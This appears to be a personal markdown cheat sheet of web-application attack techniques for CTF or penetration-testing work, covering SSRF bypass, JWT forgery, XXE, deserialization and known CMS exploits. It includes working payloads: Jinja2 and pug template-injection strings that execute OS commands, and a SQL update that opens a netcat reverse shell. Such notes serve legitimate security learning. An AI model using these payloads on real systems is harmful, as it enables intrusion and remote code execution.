## If we can confirm an SSRF and want to access internal services like any internal webapp, or internal ftp service but cant due to blacklistings
Then we can host a 301 redirctor link to the director here: https://gist.github.com/TheHackerDev/853b17e9f03c6d5a1cebd9556327e94c. Using this, we can make the server GET our page (which isnt blocked by the blacklist) which will redirect it to localhost, or any other website of our choice.

## If we have a node.js app and it uses pug js and flat js we can do an AST prototype pollution
This attack can be performed else where too, just that we know too little about it for now, to make it work else where, more on this in here https://blog.p6.is/AST-Injection/

## If we have a laravel app
### If the version is through 5.5.40 and 5.6.x through 5.6.29
If we have its base64 encoded APP_KEY then we can use this https://github.com/AlienX2001/better-poc-for-CVE-2018-15133 to get an rce on the machine

## In case of an adminer instance
https://infosecwriteups.com/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f

## for drupal CMS
### If we engage with drupal CMS including 8.5 prior to 8.5.1, 7.x prior to 7.58 and all version of Drupal 6.
Then we can use drupalgeddon2.0 exploit

## If via burp or from the page source analysis we see that the webapp is working with xml
Then we can check for xxe, more on that here https://portswigger.net/web-security/xxe and https://www.synack.com/blog/a-deep-dive-into-xxe-injection/

## If we are working with JWT
If we somehow get a hold of the algorithm key, if its using HS256/RS256 algorithm then we can craft our own jwt signed with the leaked key to get access
If we see that the key is getting imported from a remote location and if we can somehow change that parameter, then we can put our own server in there and then sign the jwts from our own server's key and still get access to sensitive info

## If we manage to get hold of the aws dynamoDB js shell
We can use the templates and extract information about the DB and use those in the aws cli to get code exec

## In support portals if we get email addresses to contact to
Then we might be able to leverage that to get private emails as was with the case with HTB's delivery box, can refer writeups of the same to know more

## We can also find for SSTI
1. For python webapps(flask/jinja2), we can put in `{{request.application.__globals__.__builtins__.__import__('os').popen('CMD').read()}}` to get RCE

2. For noedjs webapps(pugjs), we can put in `#{global.process.mainModule.constructor._load("child_process").exec("CMD+>+static/css/main.css",(err,stdout,stderr)=>{(console.log(stdout))})}` to get RCE, here we redirect the output to a file which we can access via the webapp because the output of the execution will get reflected in the console, which we do not have access to, so it is better to redirect the output to a file which we can reload to get our info

## If we are running an apache tomcat 
### If they are any of the following Apache Tomcat 10.x < 10.0.0-M5, Apache Tomcat 9.x < 9.0.35, Apache Tomcat 8.x < 8.5.55. Apache Tomcat 7.x < 7.0.104
Then we can follow through this blog to get RCE https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/ and we can use ysoserial to get our serialized payload. To transfer non text stuff from terminal to burp, its best to print out non text's base64 string, copy that to burp and then decode, that way there will be no corruption of bits
#### PS: php also has a deserialization bug like java applets

## If we have a wp page
Then we can use wpscan to scan through the plugins and other stuff. Usually wp plugins tend to be vulnerable since they are 3rd party made

## For getting OS cmd shell from sql
If we have MSSQL, with right perms we can use xp_cmdshell to get os cmd exec
If we have Mysql, with right perms we can use the following payload to get os cmd exe `update settings set value='mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ip port > /tmp/f' where name='path_php_binary';-- -`, we exploited this in some version of cacti, which can be found here https://github.com/Cacti/cacti/issues/3622, but this might be exploitable in other environments

## We can also use the --eval flag of burp to dynamically change the payload by python scripts, and directly ysing the param vars as vars in the python oneliner
## If we have the manager-script role with a user in apache tomcat then we can upload a war file and get a reverse shell


## Some misc notes
1. Once we also got an instance where, in a POST request, we could double submit a parameter to the server by adding the parameter in the cookies as well as the data of the POST request
2. svn is also very much like git cli
